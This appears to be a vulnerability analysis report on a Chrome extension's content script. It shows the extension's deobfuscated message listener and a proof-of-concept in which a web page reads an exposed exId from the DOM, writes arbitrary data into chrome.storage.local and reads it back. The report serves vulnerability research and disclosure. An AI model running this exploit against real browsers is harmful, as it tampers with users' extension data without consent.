# CoCo Analysis: dlbbmmeaglbjmlddnpdbfhcpepnkfofk

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (both are TRUE POSITIVE)

---

## Sink 1: cs_window_eventListener_message -> chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dlbbmmeaglbjmlddnpdbfhcpepnkfofk/opgen_generated_files/cs_0.js
Line 467: Minified webpack bundle (actual extension code starts here)

**Code:**

```javascript
// Content script (content.min.js) - Deobfuscated for clarity
const c = randomString(20); // Random exId generated

// exId exposed to webpage via DOM attribute
const e = document.createElement("div");
e.setAttribute("id", "cc-ysh-container");
e.setAttribute("exId", c); // <- exId accessible to webpage
document.body.appendChild(e);

// Message listener
window.addEventListener("message", e => {
  if (e.data && e.data.exId === c) { // <- webpage can read exId from DOM

    // Flow 1: send-cc-contribute (storage poisoning)
    if ("send-cc-contribute" === e.data.direction) {
      const t = e.data.message; // <- attacker-controlled
      chrome.storage.local.set({cc_contribute: t}); // <- storage write
      window.postMessage({exId: c, direction: "complete-cc-contribute", message: t}, "*");
    }

    // Flow 2: send-cc-progress (storage poisoning with read-write-read pattern)
    if ("send-cc-progress" === e.data.direction) {
      const t = e.data.message; // <- attacker-controlled
      chrome.storage.local.get(["cc_progress"], e => {
        if (void 0 !== e.cc_progress) {
          e.cc_progress[t.vId] = {subs: t.subs, updatedAt: (new Date).getTime()};
          chrome.storage.local.set({cc_progress: e.cc_progress}); // <- storage write
        } else {
          const e = {};
          e[t.vId] = {subs: t.subs, updatedAt: (new Date).getTime()};
          chrome.storage.local.set({cc_progress: e}); // <- storage write
        }
        window.postMessage({exId: c, direction: "exist-cc-progress", message: {subs: t.subs}}, "*"); // <- sends data back
        window.postMessage({exId: c, direction: "complete-cc-progress"}, "*");
      });
    }

    // Flow 3: request-cc-progress (data exfiltration)
    if ("request-cc-progress" === e.data.direction) {
      const t = e.data.message;
      chrome.storage.local.get(["cc_progress"], e => {
        void 0 !== e.cc_progress && t.vId in e.cc_progress
          ? window.postMessage({exId: c, direction: "response-cc-progress", message: {subs: e.cc_progress[t.vId].subs}}, "*") // <- sends stored data back to attacker
          : window.postMessage({exId: c, direction: "response-cc-progress", message: {subs: null}}, "*");
        window.postMessage({exId: c, direction: "complete-cc-progress"}, "*");
      });
    }

    // Flow 4: check-cc-progress (data exfiltration)
    if ("check-cc-progress" === e.data.direction) {
      const t = e.data.message;
      chrome.storage.local.get(["cc_progress"], e => {
        void 0 !== e.cc_progress && t.vId in e.cc_progress
          ? window.postMessage({exId: c, direction: "exist-cc-progress", message: {subs: e.cc_progress[t.vId].subs}}, "*") // <- sends stored data back to attacker
          : window.postMessage({exId: c, direction: "exist-cc-progress", message: {subs: null}}, "*");
        window.postMessage({exId: c, direction: "complete-cc-progress"}, "*");
      });
    }
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage

**Attack:**

```javascript
// Step 1: Read the exId from DOM
const exId = document.getElementById("cc-ysh-container").getAttribute("exId");

// Step 2: Poison storage with attacker-controlled data
window.postMessage({
  exId: exId,
  direction: "send-cc-progress",
  message: {
    vId: "malicious_video_id",
    subs: {malicious: "data", can: "be", anything: "here"}
  }
}, "*");

// Step 3: Retrieve the poisoned data back
window.postMessage({
  exId: exId,
  direction: "request-cc-progress",
  message: {vId: "malicious_video_id"}
}, "*");

// Step 4: Listen for response with poisoned data
window.addEventListener("message", (e) => {
  if (e.data && e.data.direction === "response-cc-progress") {
    console.log("Exfiltrated data:", e.data.message.subs);
  }
});
```

**Impact:** Complete storage exploitation chain. An attacker on any YouTube page can poison chrome.storage.local with arbitrary data and retrieve it back. While this specific extension stores YouTube subtitle/caption progress data, the vulnerability allows an attacker to write arbitrary data to storage and read it back, achieving a complete read-write-read exploitation pattern. The extension provides a bidirectional communication channel that allows attackers to use chrome.storage.local as an arbitrary data storage and retrieval mechanism.

---

## Sink 2: cs_window_eventListener_message -> chrome_storage_local_set_sink

This is the same vulnerability as Sink 1, but CoCo detected it as a separate trace due to the multiple code paths (send-cc-contribute vs send-cc-progress) leading to chrome.storage.local.set. Both flows are exploitable as documented above.
